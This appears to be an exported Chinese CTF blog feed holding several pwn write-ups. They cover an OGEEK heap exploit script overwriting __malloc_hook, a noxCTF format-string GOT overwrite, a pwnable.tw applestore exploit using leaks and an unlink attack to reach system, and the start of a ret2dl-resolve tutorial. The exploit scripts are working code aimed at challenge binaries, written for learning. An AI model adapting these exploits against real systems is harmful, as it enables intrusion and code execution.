&#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = *(_QWORD **)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">8L</span>L); i; i = (_QWORD *)*i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="keyword">void</span> **)i[<span class="number">1</span>];</span><br><span class="line">      <span class="built_in">free</span>(v4[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">free</span>(v4[<span class="number">3</span>]);</span><br><span class="line">      <span class="built_in">free</span>(v4[<span class="number">5</span>]);</span><br><span class="line">      <span class="built_in">free</span>(v4);</span><br><span class="line">      <span class="keyword">if</span> ( !--v11 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = *(_QWORD **)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">8L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = num--;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = v16;</span><br><span class="line">      v16 = (_QWORD *)*v16;</span><br><span class="line">      <span class="built_in">free</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    result = v16;</span><br><span class="line">    *(_QWORD *)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">8L</span>L) = v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = *(_QWORD **)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">16L</span>L); j; j = (_QWORD *)*j )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (<span class="keyword">void</span> **)j[<span class="number">1</span>];</span><br><span class="line">      <span class="built_in">free</span>(v7[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">free</span>(v7[<span class="number">3</span>]);</span><br><span class="line">      <span class="built_in">free</span>(v7);</span><br><span class="line">      <span class="keyword">if</span> ( !--v11 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = *(_QWORD **)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">16L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = num--;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v9 = v18;</span><br><span class="line">      v18 = (_QWORD *)*v18;</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">    &#125;</span><br><span class="line">    result = v18;</span><br><span class="line">    *(_QWORD *)(*(_QWORD *)(qword_203050 + <span class="number">8</span>) + <span class="number">16L</span>L) = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong choice"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = **(_QWORD ***)(qword_203050 + <span class="number">8</span>); k; k = (_QWORD *)*k )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = (<span class="keyword">void</span> **)k[<span class="number">1</span>];</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">3</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">if</span> ( !--v11 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v14 = **(_QWORD ***)(qword_203050 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">while</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = num--;</span><br><span class="line">      <span class="keyword">if</span> ( !v1 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v2 = v14;</span><br><span class="line">      v14 = (_QWORD *)*v14;</span><br><span class="line">      <span class="built_in">free</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    result = *(_QWORD **)(qword_203050 + <span class="number">8</span>);</span><br><span class="line">    *result = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="17-py"><a href="#17-py" class="headerlink" title="17.py"></a>17.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, vul_type, data_size, data, note_size, note, offset=<span class="string">''</span>, shellcode_size=<span class="number">0</span>, shellcode=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'0day\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">if</span> vul_type == <span class="string">'l'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'bug\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'size :'</span>, str(data_size))</span><br><span class="line">        p.sendafter(<span class="string">'data :'</span>, data)</span><br><span class="line">        p.sendlineafter(<span class="string">'size :'</span>, str(note_size))</span><br><span class="line">        p.sendafter(<span class="string">'note :'</span>, note)</span><br><span class="line">        p.sendafter(<span class="string">'offset :'</span>, offset)</span><br><span class="line">    <span class="keyword">elif</span> vul_type == <span class="string">'m'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'bug\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'size :'</span>, str(data_size))</span><br><span class="line">        p.sendafter(<span class="string">'data :'</span>, data)</span><br><span class="line">        p.sendlineafter(<span class="string">'size :'</span>, str(note_size))</span><br><span class="line">        p.sendafter(<span class="string">'note :'</span>, note)</span><br><span class="line">        p.sendlineafter(<span class="string">'size :'</span>, str(shellcode_size))</span><br><span class="line">        p.sendafter(<span class="string">'shellcode :'</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(p, vul_type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'0day\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">if</span> vul_type == <span class="string">'l'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'3. Logic\n'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, vul_type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'0day\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">    <span class="keyword">if</span> vul_type == <span class="string">'l'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'3. Logic\n'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(p, vul_type, count)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'0day\n'</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">if</span> vul_type == <span class="string">'l'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'3. Logic\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">elif</span> vul_type == <span class="string">'m'</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'3. Logic\n'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'handle in?'</span>, str(count))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./0day_manage'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'47.112.137.133'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">'l'</span>, <span class="number">0x200</span>, <span class="string">'sunichi'</span>, <span class="number">0x410</span>, <span class="string">'sunichi'</span>, offset=<span class="string">'sunichi'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    handle(p, <span class="string">'l'</span>, <span class="number">1</span>)</span><br><span class="line">    handle(p, <span class="string">'l'</span>, <span class="number">1</span>)</span><br><span class="line">    show(p, <span class="string">'l'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note :'</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fa22c3e6ca0</span> - <span class="number">0x00007fa22bffb000</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">'m'</span>, <span class="number">0x68</span>, <span class="string">'sunichi'</span>, <span class="number">0x68</span>, <span class="string">'sunichi'</span>, shellcode_size=<span class="number">0x68</span>, shellcode=<span class="string">'cat flag'</span>)</span><br><span class="line">    <span class="comment">#add(p, 'l', 0x20, 'sunichi', 0x20, 'sunichi', 'sunichi')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    handle(p, <span class="string">'m'</span>, <span class="number">0</span>)</span><br><span class="line">    handle(p, <span class="string">'m'</span>, <span class="number">0</span>)</span><br><span class="line">    handle(p, <span class="string">'m'</span>, <span class="number">0</span>)</span><br><span class="line">    handle(p, <span class="string">'m'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">'m'</span>, <span class="number">0x68</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>), <span class="number">0x68</span>, <span class="string">'sunichi'</span>, shellcode_size=<span class="number">0x68</span>, shellcode=<span class="string">'sunichi'</span>)</span><br><span class="line">    <span class="comment">#add(p, 'm', 0x68, 'sunichi', 0x68, , shellcode_size=0x18, shellcode='sunichi')</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'0day\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'bug\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size :'</span>, str(<span class="number">0x68</span>))</span><br><span class="line">    p.sendafter(<span class="string">'data :'</span>, <span class="string">'sunichi'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size :'</span>, str(<span class="number">0x68</span>))</span><br><span class="line">    p.sendafter(<span class="string">'note :'</span>, <span class="string">'\x00\x00\x00'</span> + p64(<span class="number">0</span>) + p64(libc.address+<span class="number">0x4f2c5</span>) + p64(libc.symbols[<span class="string">'realloc'</span>] + <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"><span class="comment">#flag&#123;f4491f7f790a0dc010dcfb0fae927790&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OGEEK CTF</category>
      </categories>
  </entry>
  <entry>
    <title>TheNameCalculator</title>
    <url>/2020/09/03/TheNameCalculator/</url>
    <content><![CDATA[<p>#<br>noxCTF-TheNameCalculator</p>
<p>##<br>漏洞分析</p>
<p>在终端运行文件，提示输入姓名，随便输入之后输出字符串，看样子输入不是很让出题人满意。。。</p>
<p><img src="/2020/09/03/TheNameCalculator/1.JPG" alt="test"></p>
<p>IDA反编译之后F5一键转成C代码，根据命名找到secretFunc，发现里面有格式化字符串漏洞，即printf里面将用户输入作为其参数。看调用这个函数的位置，似乎没法转成C代码，直接看汇编，大概看出来先给了提示字符串，之后输出，再调用read函数从用户输入中读取最多32个字节，可以看到存储输入的数组的起始位置为ebp-0x2c，而最后跳转逻辑比较的是ebp-0x10处的内容与0X06A4B825的大小，因此只要让输入的28-32这四个字节与之相同即可进入secretFunc。<br><img src="/2020/09/03/TheNameCalculator/2.jpg" alt="first_jmp"></p>
<p>继续看secretFunc，这次read上限是27字节，还是蛮有限，联想起上次给了大概40个字节还是不能用pwn自己的函数来构造，这个长度估计也只能用%k$hn或者%k$n。这里的一个小障碍是输入的字符给按字节异或处理了一下，原始输入的结果基本不能用了，因此要想想办法逆回去</p>
<p><img src="/2020/09/03/TheNameCalculator/3.jpg" alt="secretFunc"></p>
<p>异或其实按照它的异或方式处理一次，在程序中就可以还原回去，相当于A xor B xor B -&gt; A xor 0 = A。道理都懂，但是对于编程很菜的我来说还是有点难度，把输入的字符串当成一排滑槽，下面有个0x5F7B4153向右滑，第一个字节和0x53异或，第二个字节和0x53和0x41异或，第三个字节和0x53和0x41和0x7B异或，之后的字节一直到倒数第四个都是和四个字节异或，同理倒数第三个和0x5F、0x7B、0x5F异或，倒数第二个和倒数两个字节异或（小端顺序中的高位），最后一个字节和倒数第一个字节异或。为了编程方便，我统一都写满27字节。</p>
<p><img src="/2020/09/03/TheNameCalculator/4.jpg" alt="enc"></p>
<p>最后最关键的是printf任意写地址要修改哪里，之前做过的覆盖return addr的例子在这里不好使了，因为这次开启了ASLR，本来经过观察有个地址和返回地址所在栈地址的差总是0x14，但是泄露这个地址发现它总是在变化，而我们只有一次使用printf的机会，因此这条路就没了。剩下的只有是通过覆盖got表地址的方式，看到这里有个exit还不错，本来有return了，彷佛是刻意留的函数。但是这个if条件怎么能满足呢，GDB断点调试一下，发现这竟然是exit的地址，因此修改了exit地址之后恰好可以满足条件，调用exit@got从而进入super函数拿到flag。</p>
<p><img src="/2020/09/03/TheNameCalculator/5.jpg" alt="exit"><br><img src="/2020/09/03/TheNameCalculator/6.jpg" alt="exit_2"></p>
<p>##<br>寻找格式化字符串偏移</p>
<p>先用AAAA+’%p’*11+’a’的方式，发现没有0x41414141，说明偏移比较靠后，还是gdb.attach()实时调一下,断点下在printf，先find 0x41414141，得到的地址用fmtarg和格式化字符串比较一下，得到参数地址与格式化字符串的地址为13，这里是相对函数的偏移，因此相对于格式化字符串的偏移是12</p>
<p><img src="/2020/09/03/TheNameCalculator/7.jpg" alt="distance"></p>
<p>##<br>exp</p>
<p>综合之前的信息，我们需要得到exit@got，然后用superFunc的地址覆盖,IDA可以看到函数相对地址是0x596，加上0x08048000的装载基地址，其实际地址为0x08048596，而exit@got的值为0x0804a024，只有后面四个字节不同，因此使用hn的方式覆写双字节，0x8596-4 = 34194，最后的输入为p32(exit_addr)+’%34194c%12$hn’+padding</p>
<p><img src="/2020/09/03/TheNameCalculator/8.jpg" alt="code"></p>
<p><img src="/2020/09/03/TheNameCalculator/9.jpg" alt="flag"></p>
]]></content>
      <categories>
        <category>noxCTF</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable.tw-&gt;applestore</title>
    <url>/2020/09/03/applestore/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-applestore"><a href="#pwnable-tw-gt-applestore" class="headerlink" title="pwnable.tw-&gt;applestore"></a>pwnable.tw-&gt;applestore</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学了一点fastbin attack之后开始重新刷题，但是pwnbale.tw对于我这菜鸡来说还是有点难，磕磕绊绊看着p4nda学长调了下来，感觉自己做题一点思路都没有，还是要踏实地学习</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>F5之后发现程序还是有几个关键的功能，列出苹果产品，购买一个产品，删除一个产品，查看自己加入购物车的产品，结账</p>
<p><img src="/2020/09/03/applestore/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/applestore/2.jpg" alt="main_func"></p>
<p>有输入的地方都需要特别注意，选择功能这里的输入函数似乎没什么问题，因为其地址为ebp-0x22，read长度为0x15，没有越界写<br>下面挨个看下功能函数，list没东西，add里有个create子函数，里面是malloc一个地址，赋给这个结构体的name和price。这里说下找到的结构体，每次操作的基本单元就是这样一个结构体，成员包括商品名，价格，下个结构体地址，上个结构体地址。Add里create之后还会使用Insert函数在原链表后面插入新的节点，链表头在bss段的&amp;myCart处。<br><img src="/2020/09/03/applestore/3.jpg" alt="struct"></p>
<p><img src="/2020/09/03/applestore/4.jpg" alt="add"></p>
<p><img src="/2020/09/03/applestore/5.jpg" alt="create"></p>
<p><img src="/2020/09/03/applestore/6.jpg" alt="insert"></p>
<p>delete函数相比之下简单一些，输入item number，遍历寻找链表节点，将被删除节点的前一个节点的Next指向item-&gt;next，被删除节点的下一个节点的前一个节点指向item-&gt;last。  </p>
<p><img src="/2020/09/03/applestore/7.jpg" alt="delete"></p>
<p>cart函数从myCart开始依次输出商品的名字和价格</p>
<p><img src="/2020/09/03/applestore/8.jpg" alt="cart"></p>
<p>checkout函数比较有意思，cart会得到一个商品总价格，这个价格是7174的时候会将ebp-0x20处作为最后一个chunk插入链表。这个地址看起来也没什么问题，因为虽然是栈上地址，但是这里的函数没有read，无法溢出覆盖。但是这个if条件这么苛刻，漏洞一定就在这里，再看一下别的含有read的函数，这里可以想到虽然原函数里没有直接输入可以溢出，但是由于这些函数都是main_func调用的，每次给的函数栈都是一样的，所以checkout之后再调用cart，他们的函数栈都是分配的一样的，这就给了我们利用的机会。</p>
<p><img src="/2020/09/03/applestore/9.jpg" alt="checkout"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>继续刚才的说，cart，delete，add函数里都有read的部分，这些函数可以溢出到最后一个chunk，cart里会有输出chunk-&gt;name,chunk-&gt;price的函数，以此可以泄露地址，而delete类似unlink，可以考虑构造unlink攻击。<br>首先是这个If条件，list里的价格是199、299、399、499。最终价格是7174，以4结尾，6<em>9=54,所以肯定是</em>6的数量，而最大是499，最小是199，所以最终应当是36-14之间，写个Python脚本，四个循环遍历一下就出来了，有很多结果，选一个简单的就是6个199，20个299的。  </p>
<h3 id="泄露libc函数地址"><a href="#泄露libc函数地址" class="headerlink" title="泄露libc函数地址"></a>泄露libc函数地址</h3><p>思路：首先create6个199，20个299，进入checkout分配栈上地址，在cart函数里修改栈数据（由于read函数不受’\x00’影响，输入’y\x00abcd’不影响buf比较但是可以覆盖栈数据），name填read@got，打印出read的实际地址</p>
<h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>思路：由于全局变量myCart存储的第一个struct的地址，因此name填&amp;myCart+8即可输入malloc的第一个chunk地址，再减去相应的偏移即可找到堆分配的基地址</p>
<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>思路：能得到堆地址的基础上，我们可以每次填入chunk-&gt;next的地址，使得每次输入都是下一个chunk的地址，依此到第26次输出的chunk-&gt;next_addr就是stack_addr</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>思路：这个结构体的删除类似unlink加上我们可以控制最后一个结构体的数据，可以使用unlink，但是unlink有副作用，FD-&gt;bk = BK = addr2,<em>(addr1+12)=addr2，BK-&gt;fd = FD，</em>(addr2+8) = addr1，如果直接覆盖return_addr为shell_addr，则要么addr1 = return_addr-12，要么addr2 = return_addr-8,第一种情况下会导致<em>(shell_addr+8)=return_addr-12，第二种情况</em>(shell_addr+12)=return_addr-8，都会有副作用，这里就要使用一个常见的套路，就是要覆盖调用函数的ebp，即FD=stack_addr，BK=ebp_addr-8，使得<em>ebp=stack_addr,这样的副作用是</em>(stack_addr+12)=ebp_addr-8，stack_addr是我们伪造的一个栈结构，其值为fake_ebp+system_addr+fake_ebp+’/bin/sh’_addr，这个副作用完全不影响我们的利用。<br>在被调函数执行完毕后，调用函数的ebp被换成了stack_addr，这样在leave ret的时候pop出fake_ebp，eip就指向system_addr了。这里的fake_stack我们可以选择handler里的可控区域.</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./applestore'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./applestore'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Device Number&gt; '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Item Number&gt; '</span>)</span><br><span class="line">    p.send(number)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LisApp</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Checkout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">Checkout()</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(read_got)+p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">LisApp(payload)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr =&gt; '</span> + hex(libc_base))</span><br><span class="line"><span class="comment">## leak heap addr</span></span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(<span class="number">0x0804b068</span>+<span class="number">8</span>)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">LisApp(payload)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x410</span></span><br><span class="line">log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">heap_addr =  heap_base+<span class="number">0x410</span></span><br><span class="line"><span class="comment">## leak stack</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    payload = <span class="string">'y\x00'</span>+p32(heap_addr+<span class="number">8</span>)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    LisApp(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line">log.success(<span class="string">'stack addr =&gt; '</span> + hex(heap_addr))</span><br><span class="line"><span class="comment">## unlink</span></span><br><span class="line">return_addr = heap_addr + <span class="number">0x20</span> + <span class="number">4</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3a819</span></span><br><span class="line">stack_addr = heap_addr + <span class="number">0x60</span> <span class="number">-0x20</span></span><br><span class="line">addr1 = stack_addr</span><br><span class="line">addr2 = stack_addr + <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">payload = flat(<span class="string">'27'</span>,<span class="number">0</span>,<span class="number">0</span>,addr1,addr2)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number&gt; '</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">payload = <span class="string">'6\x00'</span></span><br><span class="line">esp = <span class="number">0xdeadbeef</span></span><br><span class="line">payload += flat(esp,system_addr,esp,esp)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>baby_pwn</title>
    <url>/2020/09/03/baby_pwn/</url>
    <content><![CDATA[<h1 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年信安竞赛的题，本以为是最简单的一道，结果发现做不来，最后查到这个就在ctf-wiki里，当时自己学wiki的时候这个高级ROP被跳过了。。恶补一下ret2dl-resolve的知识</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>栈溢出，栈不可执行，没有泄露地址的函数</p>
<p><img src="/2020/09/03/baby_pwn/1.jpg" alt="main"></p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>_dl_runtime_resolve函数是重定位的核心函数，这个函数会在进程运行的时候动态修改引用的函数地址，达到重定位的效果。使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump ./pwn -d -j .plt</span><br></pre></td></tr></table></figure></p>
<p>可以看到.plt这里会调用0x0804a008，在IDA里可以看到这里存放的是函数的plt表，函数表里存放got表指针，got表里存放的是函数执行的实际地址，在函数执行时才会放进去</p>
<p><img src="/2020/09/03/baby_pwn/2.jpg" alt=".plt"></p>
<p><img src="/2020/09/03/baby_pwn/3.jpg" alt="dyn_table"></p>
<h3 id="ELF动态链接的关键section"><a href="#ELF动态链接的关键section" class="headerlink" title="ELF动态链接的关键section"></a>ELF动态链接的关键section</h3><p>函数执行时涉及到的Section包括.dynamic、.dynstr、.dynsym、.rel.plt。使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -S ./pwn | grep <span class="string">'dynamic'</span></span><br></pre></td></tr></table></figure></p>
<p>可以查看其地址为0x08049f14，在IDA中看其内容，这个节中包含了动态链接的信息，需要关注的是DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针</p>
<p><img src="/2020/09/03/baby_pwn/4.jpg" alt=".dynamic"></p>
<p>.rel.plt是重定位表，它的每一个成员都是一个结构体，其结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;   <span class="comment">//r_info &gt;&gt; 8 作为.dynsym的下标去寻找Elf32_Sym的指针</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>在函数执行过程中会先用.rel.plt得到函数重定位表项的指针Elf32_Rel，之后rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针</p>
<p><img src="/2020/09/03/baby_pwn/5.jpg" alt=".rel.plt"></p>
<p>.dynsym是符号表数组，每一个表项是一个结构体，其结构如下：</p>
